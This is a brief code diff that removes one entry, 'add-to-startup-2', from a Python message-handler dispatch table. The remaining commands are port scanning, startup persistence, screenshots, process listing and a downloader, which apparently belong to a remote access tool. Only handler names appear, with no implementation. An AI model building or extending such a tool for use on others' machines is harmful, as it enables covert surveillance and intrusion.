@@ -70,7 +70,6 @@ def handle_input(message: str):
         "set-interval": set_interval,
         "scan-ports": nu.scan_ports,
         "add-to-startup-1": lu.add_to_startup_1,
-        "add-to-startup-2": lu.add_to_startup_2,
         "screenshot": sh.handle_screenshot,
         "get-processes": lu.processes,
         "downloader": d.downloader,
